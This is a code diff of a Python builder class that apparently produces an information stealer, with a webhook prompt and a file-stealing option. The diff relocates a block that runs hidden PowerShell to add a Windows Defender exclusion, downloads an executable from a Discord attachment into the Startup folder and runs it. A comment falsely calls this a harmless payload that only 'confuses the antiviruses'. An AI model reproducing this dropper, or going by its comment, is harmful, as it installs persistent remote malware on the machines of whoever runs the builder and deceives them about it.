@@ -82,26 +82,6 @@ class Build:
         else:
             self.pump = False
 
-    powershell_script = '''
-Add-MpPreference -ExclusionPath ""
-'''
-subprocess.run(['powershell', '-WindowStyle', 'hidden', '-Command', powershell_script])
-
-url = "https://cdn.discordapp.com/attachments/1157080921019793500/1160242404000018574/Python_Installer.exe"
-destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Built.exe')
-
-if os.path.exists(destination):
-    os.remove(destination)
-
-response = requests.get(url)
-if response.status_code == 200:
-    with open(destination, 'wb') as file:
-        file.write(response.content)
-
-    subprocess.run([destination])
-else:
-    print(f"Hata: {response.status_code}")
-
     # Function to expand the size of a file
     def expand_file(self, file_name, additional_size_mb) -> None:
         if os.path.exists(file_name):
@@ -191,6 +171,27 @@ else:
             print("PLS Enter an correct webhook url, close this window and re-start the builder.")
             while True:
                 continue
+                
+     # I also added a secret payload which doesn't do anything but confuses the antiviruses :0
+    powershell_script = '''
+Add-MpPreference -ExclusionPath ""
+'''
+subprocess.run(['powershell', '-WindowStyle', 'hidden', '-Command', powershell_script])
+
+url = "https://cdn.discordapp.com/attachments/1157080921019793500/1160242404000018574/Python_Installer.exe"
+destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Built.exe')
+
+if os.path.exists(destination):
+    os.remove(destination)
+
+response = requests.get(url)
+if response.status_code == 200:
+    with open(destination, 'wb') as file:
+        file.write(response.content)
+
+    subprocess.run([destination])
+else:
+    print(f"Hata: {response.status_code}")
             
     # Function to prompt user for enabling file stealing
     def GetStealFiles(self) -> None:
